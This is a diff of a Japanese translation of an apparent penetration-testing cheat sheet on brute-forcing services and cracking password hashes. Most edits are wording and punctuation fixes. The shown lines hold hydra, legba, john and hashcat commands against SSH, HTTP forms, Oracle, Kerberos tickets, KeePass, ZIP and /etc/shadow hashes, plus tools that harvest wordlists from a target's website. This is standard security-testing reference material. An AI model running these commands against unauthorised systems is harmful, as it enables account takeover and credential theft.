@@ -4,7 +4,7 @@
 
 ## デフォルトの資格情報
 
-**使用されている技術のデフォルトの資格情報をGoogleで検索**するか、**これらのリンクを試してください**：
+**使用されている技術のデフォルトの資格情報をGoogleで検索**するか、**これらのリンクを試してください**:
 
 - [**https://github.com/ihebski/DefaultCreds-cheat-sheet**](https://github.com/ihebski/DefaultCreds-cheat-sheet)
 - [**http://www.phenoelit.org/dpl/dpl.html**](http://www.phenoelit.org/dpl/dpl.html)
@@ -21,7 +21,7 @@
 
 ## **独自の辞書を作成する**
 
-ターゲットに関する情報をできるだけ多く集めて、カスタム辞書を生成します。役立つツール：
+ターゲットに関する情報をできるだけ多く集めて、カスタム辞書を生成します。役立つツール:
 
 ### Crunch
 ```bash
@@ -34,9 +34,16 @@ crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha # Only length 4 using chars
 ^ Special characters including spac
 crunch 6 8 -t ,@@^^%%
 ```
-### Cewl
+### ウェブサイトベースのワードリスト
 ```bash
+# Cewl gets words from the victims page
 cewl example.com -m 5 -w words.txt
+
+# Tok (https://github.com/tomnomnom/hacks/tree/master/tok) gets words from a list of URLs
+cat /path/to/urls.txt | tok
+
+# https://github.com/m4ll0k/BBTz/blob/master/getjswords.py gets words from a list of JS URLs
+cat /path/to/js-urls.txt | python3 getjswords.py
 ```
 ### [CUPP](https://github.com/Mebus/cupp)
 
@@ -113,7 +120,7 @@ legba scylla --username cassandra --password wordlists/passwords.txt --target lo
 msf> use auxiliary/scanner/couchdb/couchdb_login
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst localhost -s 5984 http-get /
 ```
-### Docker レジストリ
+### Docker Registry
 ```
 hydra -L /usr/share/brutex/wordlists/simple-users.txt  -P /usr/share/brutex/wordlists/password.lst 10.10.10.10 -s 5000 https-get /v2/
 ```
@@ -144,7 +151,7 @@ legba http.basic --username admin --password wordlists/passwords.txt --target ht
 legba http.ntlm1 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
 legba http.ntlm2 --domain example.org --workstation client --username admin --password wordlists/passwords.txt --target https://localhost:8888/
 ```
-### HTTP - ポストフォーム
+### HTTP - Post Form
 ```bash
 hydra -L /usr/share/brutex/wordlists/simple-users.txt -P /usr/share/brutex/wordlists/password.lst domain.htb  http-post-form "/path/index.php:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
 # Use https-post-form mode for https
@@ -271,7 +278,7 @@ nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>
 
 legba oracle --target localhost:1521 --oracle-database SYSTEM --username admin --password data/passwords.txt
 ```
-**oracle_login**を**patator**で使用するには、**インストール**する必要があります：
+**oracle_login**を**patator**で使用するには、**install**する必要があります:
 ```bash
 pip3 install cx_Oracle --upgrade
 ```
@@ -395,11 +402,11 @@ legba ssh --username admin --password '@/some/path/*' --ssh-auth-mode key --targ
 ```
 #### 弱いSSHキー / Debianの予測可能なPRNG
 
-一部のシステムには、暗号材料を生成するために使用されるランダムシードに既知の欠陥があります。これにより、[snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute)のようなツールでブルートフォース攻撃が可能な大幅に減少したキー空間が生じる可能性があります。弱いキーの事前生成されたセットも利用可能であり、例えば[g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)があります。
+一部のシステムには、暗号材料を生成するために使用されるランダムシードに既知の欠陥があります。これにより、キー空間が劇的に減少し、[snowdroppe/ssh-keybrute](https://github.com/snowdroppe/ssh-keybrute)のようなツールでブルートフォース攻撃が可能になります。弱いキーの事前生成されたセットも利用可能で、例えば[g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)があります。
 
-### STOMP (ActiveMQ, RabbitMQ, HornetQおよびOpenMQ)
+### STOMP (ActiveMQ, RabbitMQ, HornetQ および OpenMQ)
 
-STOMPテキストプロトコルは、RabbitMQ、ActiveMQ、HornetQ、OpenMQなどの人気のあるメッセージキューサービスとの**シームレスな通信と相互作用を可能にする**広く使用されているメッセージングプロトコルです。メッセージを交換し、さまざまなメッセージング操作を実行するための標準化された効率的なアプローチを提供します。
+STOMPテキストプロトコルは、**RabbitMQ、ActiveMQ、HornetQ、およびOpenMQなどの人気のあるメッセージキューサービスとのシームレスな通信と相互作用を可能にする**広く使用されているメッセージングプロトコルです。メッセージを交換し、さまざまなメッセージング操作を実行するための標準化された効率的なアプローチを提供します。
 ```bash
 legba stomp --target localhost:61613 --username admin --password data/passwords.txt
 ```
@@ -471,9 +478,9 @@ john zip.john
 hashcat.exe -m 13600 -a 0 .\hashzip.txt .\wordlists\rockyou.txt
 .\hashcat.exe -m 13600 -i -a 0 .\hashzip.txt #Incremental attack
 ```
-#### 既知平文ZIP攻撃
+#### Known plaintext zip attack
 
-暗号化されたZIP内に含まれるファイルの**平文**（または平文の一部）を知っている必要があります。暗号化されたZIP内に含まれる**ファイル名とファイルのサイズ**を確認するには、次のコマンドを実行します: **`7z l encrypted.zip`**\
+暗号化されたzip内に含まれる**ファイルの** **平文**（または平文の一部）を知っている必要があります。暗号化されたzip内に含まれる**ファイル名とファイルサイズ**を確認するには、**`7z l encrypted.zip`**を実行します。\
 [**bkcrack** ](https://github.com/kimci86/bkcrack/releases/tag/v1.4.0)をリリースページからダウンロードしてください。
 ```bash
 # You need to create a zip file containing only the file that is inside the encrypted zip
@@ -528,7 +535,7 @@ Format:USUARIO:ID:HASH_LM:HASH_NT:::
 john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT file_NTLM.hashes
 hashcat -a 0 -m 1000 --username file_NTLM.hashes /usr/share/wordlists/rockyou.txt --potfile-path salida_NT.pot
 ```
-### キーパス
+### Keepass
 ```bash
 sudo apt-get install -y kpcli #Install keepass tools like keepass2john
 keepass2john file.kdbx > hash #The keepass is only using password
@@ -536,7 +543,7 @@ keepass2john -k <file-password> file.kdbx > hash # The keepass is also using a f
 #The keepass can use a password and/or a file as credentials, if it is using both you need to provide them to keepass2john
 john --wordlist=/usr/share/wordlists/rockyou.txt hash
 ```
-### ケベロースティング
+### Keberoasting
 ```bash
 john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
 hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
@@ -553,7 +560,7 @@ cryptsetup luksOpen backup.img mylucksopen
 ls /dev/mapper/ #You should find here the image mylucksopen
 mount /dev/mapper/mylucksopen /mnt
 ```
-#### 方法 2
+#### 方法2
 ```bash
 cryptsetup luksDump backup.img #Check that the payload offset is set to 4096
 dd if=backup.img of=luckshash bs=512 count=4097 #Payload offset +1
@@ -585,10 +592,10 @@ john --wordlist=/usr/share/wordlists/rockyou.txt ./hash
 
 ### Open Office パスワード保護された列
 
-パスワードで保護された列を持つ xlsx ファイルがある場合、次のようにして解除できます：
+パスワードで保護された列を持つ xlsx ファイルがある場合、次のようにして保護を解除できます：
 
 - **Google ドライブにアップロード**すると、パスワードが自動的に削除されます。
-- **手動で**解除するには：
+- **手動で**それを**削除**するには：
 ```bash
 unzip file.xlsx
 grep -R "sheetProtection" ./*
@@ -701,7 +708,7 @@ hashcat.exe -a 7 -m 1000 C:\Temp\ntlm.txt ?d?d?d?d \wordlist.txt
 ```bash
 hashcat --example-hashes | grep -B1 -A2 "NTLM"
 ```
-Linuxハッシュのクラッキング - /etc/shadowファイル
+Linuxハッシュのクラック - /etc/shadowファイル
 ```
 500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
 3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
